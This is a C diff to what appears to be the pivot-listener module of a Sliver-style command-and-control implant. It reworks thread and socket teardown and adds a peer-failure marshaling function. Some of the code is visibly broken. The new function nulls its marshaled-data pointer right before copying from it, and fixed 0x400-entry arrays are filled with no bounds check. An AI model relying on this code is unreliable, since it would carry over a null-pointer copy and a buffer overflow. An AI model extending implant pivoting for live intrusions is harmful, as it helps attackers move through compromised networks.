@@ -140,26 +140,27 @@ CLEANUP:
 
 VOID FreePivotListener
 (
-	_In_ PPIVOT_LISTENER pPivoListener
+	_In_ PPIVOT_LISTENER pListener
 )
 {
 	DWORD i = 0;
 	PPIVOT_CONNECTION pConnection = NULL;
 
-	if (pPivoListener != NULL) {
-		FREE(pPivoListener->lpBindAddress);
-		for (i = 0; i < pPivoListener->dwNumberOfConnections; i++) {
-			pConnection = pPivoListener->Connections[i];
-			pConnection->IsExiting = TRUE;
-			pPivoListener->Connections[i] = NULL;
+	if (pListener != NULL) {
+		pListener->IsExiting = TRUE;
+		if (pListener->dwType == PivotType_TCP) {
+			closesocket((SOCKET)pListener->ListenHandle);
 		}
 
-		FREE(pPivoListener->Connections);
-		if (pPivoListener->dwType == PivotType_TCP) {
-			closesocket((SOCKET)pPivoListener->ListenHandle);
+		if (pListener->hThread != NULL) {
+			WaitForSingleObject(pListener->hThread, INFINITE);
+			CloseHandle(pListener->hThread);
 		}
-
-		FREE(pPivoListener);
+		
+		FREE(pListener->lpBindAddress);
+		FREE(pListener->Connections);
+		DeleteCriticalSection(&pListener->Lock);
+		FREE(pListener);
 	}
 }
 
@@ -334,6 +335,7 @@ VOID FreePivotConnection
 )
 {
 	if (pConnection != NULL) {
+		FREE(pConnection->lpRemoteAddress);
 		FREE(pConnection);
 	}
 }
@@ -407,6 +409,7 @@ VOID PivotConnectionStart
 
 	pListener = pConnection->pListener;
 	pConfig = pListener->pConfig;
+	EnterCriticalSection(&pListener->Lock);
 	if (pListener->Connections == NULL) {
 		pListener->Connections = ALLOC(sizeof(PPIVOT_CONNECTION));
 	}
@@ -415,8 +418,9 @@ VOID PivotConnectionStart
 	}
 
 	pListener->Connections[pListener->dwNumberOfConnections++] = pConnection;
+	LeaveCriticalSection(&pListener->Lock);
 	while (TRUE) {
-		if (pConnection->IsExiting) {
+		if (pListener->IsExiting) {
 			goto CLEANUP;
 		}
 
@@ -468,6 +472,7 @@ CLEANUP:
 	}
 
 	FreePivotConnection(pConnection);
+
 	return;
 }
 
@@ -477,10 +482,15 @@ VOID ListenerMainLoop
 )
 {
 	PPIVOT_CONNECTION pNewConnection = NULL;
+	HANDLE hThreads[0x400];
+	SOCKET Sockets[0x400];
+	DWORD dwNumberOfThreads = 0;
+	DWORD i = 0;
 
+	SecureZeroMemory(hThreads, sizeof(hThreads));
 	while (TRUE) {
 		if (pListener->IsExiting) {
-			goto CLEANUP;
+			break;
 		}
 
 		pNewConnection = pListener->Accept(pListener);
@@ -488,9 +498,43 @@ VOID ListenerMainLoop
 			continue;
 		}
 
-		CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)PivotConnectionStart, (LPVOID)pNewConnection, 0, NULL);
+		if (pListener->dwType == PivotType_TCP) {
+			Sockets[dwNumberOfThreads] = ((PSLIVER_TCP_CLIENT)pNewConnection->lpDownstreamConn)->Sock;
+		}
+
+		hThreads[dwNumberOfThreads++] = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)PivotConnectionStart, (LPVOID)pNewConnection, 0, NULL);
 	}
 
-CLEANUP:
-	FreePivotListener(pListener);
+	for (i = 0; i < dwNumberOfThreads; i++) {
+		if (pListener->dwType == PivotType_TCP) {
+			closesocket(Sockets[i]);
+		}
+	}
+
+	WaitForMultipleObjects(dwNumberOfThreads, hThreads, TRUE, INFINITE);
+
+}
+
+PBUFFER MarshalPivotPeerFailure
+(
+	_In_ UINT64 uPeerID,
+	_In_ PeerFailureType FailureType,
+	_In_ LPSTR lpError
+)
+{
+	PPBElement ElementList[3];
+	DWORD i = 0;
+	PPBElement pFinalElement = NULL;
+	PBUFFER pResult = NULL;
+
+	ElementList[0] = CreateVarIntElement(uPeerID, 1);
+	ElementList[1] = CreateVarIntElement(FailureType, 2);
+	ElementList[2] = CreateBytesElement(lpError, lstrlenA(lpError), 3);
+	pFinalElement = CreateStructElement(ElementList, _countof(ElementList), 0);
+	pFinalElement->pMarshaledData = NULL;
+
+	pResult = BufferMove(pFinalElement->pMarshaledData, pFinalElement->cbMarshaledData);
+	FreeElement(pFinalElement);
+
+	return pResult;
 }
